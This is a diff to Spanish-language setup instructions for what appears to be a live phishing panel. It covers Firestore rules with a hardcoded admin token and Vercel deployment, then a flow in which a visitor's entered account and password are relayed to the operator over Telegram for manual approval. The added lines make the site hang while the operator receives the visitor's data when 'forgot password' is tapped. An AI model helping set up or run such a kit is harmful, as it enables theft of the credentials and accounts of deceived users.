@@ -42,8 +42,10 @@ Tienes que hacer 4 partes (en este orden):
   - En Firestore, abre la pestaña «Rules»
   - Borra lo que haya y pega TODO el contenido del archivo
     firestore.rules.json de este proyecto
-  - Cambia el token 'CAMBIA-ESTE-TOKEN' por uno tuyo:
-        adminToken == 'mi-clave-secreta'
+  - Cambia el token por uno tuyo dentro de la función tokenAdmin():
+        function tokenAdmin() {
+          return 'mi-clave-secreta';
+        }
   - Pulsa «Publicar»
 
 1.5) Copia los datos de tu proyecto
@@ -59,7 +61,7 @@ Tienes que hacer 4 partes (en este orden):
   - En el paso 3.2 defines TODAS las variables.
 
   IMPORTANTE: el token del asesor debe ser IGUAL en:
-    - firestore.rules.json  (paso 1.4)  → adminToken
+    - firestore.rules.json  (paso 1.4)  → función tokenAdmin()
     - Vercel → FIREBASE_ADMIN_TOKEN
 
 
@@ -174,6 +176,9 @@ botón. Se hace UNA sola vez después del deploy:
  3. En Telegram te llega: «✓ Cuenta existe / ✗ Cuenta no
     existe». Toca ✓.
  4. Escribe la contraseña → Continuar.
+     · Si el cliente toca «¿Olvidaste tu contraseña?», la web
+       se queda cargando y a ti te llega el aviso
+       «🔑 Olvidé mi contraseña» con sus datos.
  5. Te llega: «✓ Verificación exitosa / ✗ Contraseña
     incorrecta». Toca ✓.
  6. El cliente ve «Verificación exitosa» (carga) y luego la
